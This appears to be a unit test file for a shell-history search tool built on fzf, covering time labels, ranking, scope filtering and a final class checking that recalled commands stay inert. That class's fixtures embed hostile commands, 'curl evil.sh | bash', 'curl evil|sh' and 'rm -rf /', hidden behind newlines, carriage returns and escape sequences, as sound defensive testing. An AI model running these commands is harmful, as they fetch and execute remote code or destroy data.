"""Scope filtering, ranking, and the fzf line format."""

from __future__ import annotations

import os
import unittest

from woswoar import search
from woswoar.entry import Entry

from .support import MACHINE_ID, WoswoarTestCase

NOW = 1_800_000_000


class TestRelativeTime(unittest.TestCase):
    def test_scales(self) -> None:
        cases = [
            (0, "0s"),
            (45, "45s"),
            (60, "1m"),
            (59 * 60, "59m"),
            (3600, "1h"),
            (23 * 3600, "23h"),
            (86400, "1d"),
            (29 * 86400, "29d"),
            (30 * 86400, "1mo"),
            (349 * 86400, "11mo"),
            (350 * 86400, "1y"),
            (365 * 86400, "1y"),
            (900 * 86400, "2y"),
        ]
        for delta, expected in cases:
            with self.subTest(delta=delta):
                self.assertEqual(search.relative_time(NOW - delta, NOW), expected)

    def test_never_exceeds_the_column_width(self) -> None:
        # command_from_line() slices at a fixed offset, so an over-wide label
        # would silently eat the first characters of the command.
        for delta in [0, 1, 59, 61, 3599, 90000, 86400 * 29, 86400 * 364, 86400 * 365 * 40]:
            with self.subTest(delta=delta):
                self.assertLessEqual(len(search.relative_time(NOW - delta, NOW)), 4)

    def test_clock_skew_from_another_machine_is_tolerated(self) -> None:
        self.assertEqual(search.relative_time(NOW + 500, NOW), "now")


class TestRank(unittest.TestCase):
    @staticmethod
    def _entry(ts: int, cmd: str) -> Entry:
        return Entry(ts, "h", "s", "/tmp", 0, 0, cmd)

    def test_newest_first(self) -> None:
        entries = [self._entry(1, "old"), self._entry(3, "new"), self._entry(2, "mid")]
        self.assertEqual([e.cmd for e in search.rank(entries)], ["new", "mid", "old"])

    def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
        entries = [self._entry(1, "git status"), self._entry(5, "git status"), self._entry(3, "ls")]
        ranked = search.rank(entries)
        self.assertEqual([(e.ts, e.cmd) for e in ranked], [(5, "git status"), (3, "ls")])

    def test_dedup_can_be_disabled(self) -> None:
        entries = [self._entry(1, "ls"), self._entry(2, "ls")]
        self.assertEqual(len(search.rank(entries, dedup=False)), 2)


class TestRenderRoundTrip(unittest.TestCase):
    def test_command_survives_the_display_format(self) -> None:
        commands = [
            "git status",
            "awk -F'\t' '{print $1}'",
            "back\\slash",
            "über 😀",
            "x" * 300,
        ]
        entries = [Entry(NOW, "h", "s", "/tmp", 0, 0, cmd) for cmd in commands]
        lines = search.render(entries, now=NOW)

        for line, cmd in zip(lines, commands, strict=True):
            with self.subTest(cmd=cmd):
                # One entry must occupy exactly one line, or fzf would show a
                # multi-line command as several unrelated candidates.
                self.assertNotIn("\n", line)
                self.assertEqual(search.command_from_line(line), cmd)


class TestScope(WoswoarTestCase):
    def _entries(self) -> list[Entry]:
        return [
            Entry(1, MACHINE_ID, "here", "/tmp", 0, 0, "mine, this shell"),
            Entry(2, MACHINE_ID, "elsewhere", "/tmp", 0, 0, "mine, other shell"),
            Entry(3, "ffffffffffffffff", "remote", "/tmp", 0, 0, "another machine"),
        ]

    def test_global_keeps_everything(self) -> None:
        self.assertEqual(len(search.filter_scope(self._entries(), "global")), 3)

    def test_host_keeps_this_machine(self) -> None:
        got = search.filter_scope(self._entries(), "host")
        self.assertEqual([e.cmd for e in got], ["mine, this shell", "mine, other shell"])

    def test_session_keeps_this_shell(self) -> None:
        os.environ["WOSWOAR_SESSION"] = "here"
        got = search.filter_scope(self._entries(), "session")
        self.assertEqual([e.cmd for e in got], ["mine, this shell"])

    def test_session_without_the_hook_is_empty_not_an_error(self) -> None:
        os.environ.pop("WOSWOAR_SESSION", None)
        self.assertEqual(search.filter_scope(self._entries(), "session"), [])


class TestFzfArgv(unittest.TestCase):
    def test_matching_is_restricted_to_the_command_column(self) -> None:
        # Without --nth=2.., a query like "3d" would match the relative-time
        # column and surface unrelated entries.
        self.assertIn("--nth=2..", search._fzf_argv("global", "", True))

    def test_scope_keys_reload_the_right_scope(self) -> None:
        argv = search._fzf_argv("global", "", True)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        for key, scope in (("ctrl-g", "global"), ("ctrl-h", "host"), ("ctrl-s", "session")):
            self.assertIn(f"{key}:reload(", binds)
            self.assertIn(f"list --scope {scope}", binds)

    def test_no_dedup_propagates_into_the_reload_command(self) -> None:
        argv = search._fzf_argv("global", "", False)
        self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))


class TestRecalledCommandIsInert(unittest.TestCase):
    """What leaves the picker must be exactly one command.

    `render` escapes newlines so one entry occupies one display line, and fzf
    clips anything past the window edge. If `command_from_line` turned that
    escape back into a real newline, the buffer would hold a command the picker
    never showed -- and bash runs a multi-line buffer as several commands on a
    single Enter.
    """

    def _round_trip(self, cmd: str) -> str:
        entry = Entry(NOW, "h", "s", "/tmp", 0, 0, cmd)
        return search.command_from_line(search.render([entry], now=NOW)[0])

    def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
        recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
        self.assertNotIn("\n", recalled)
        self.assertIn("\\ncurl evil.sh | bash", recalled)

    def test_a_carriage_return_cannot_rewrite_the_line(self) -> None:
        self.assertNotIn("\r", self._round_trip("echo one\rrm -rf /"))

    def test_escape_sequences_do_not_reach_the_buffer(self) -> None:
        recalled = self._round_trip("ls -la\x1b[2K\x1b[1Acurl evil|sh")
        self.assertNotIn("\x1b", recalled)
        self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")


if __name__ == "__main__":
    unittest.main()
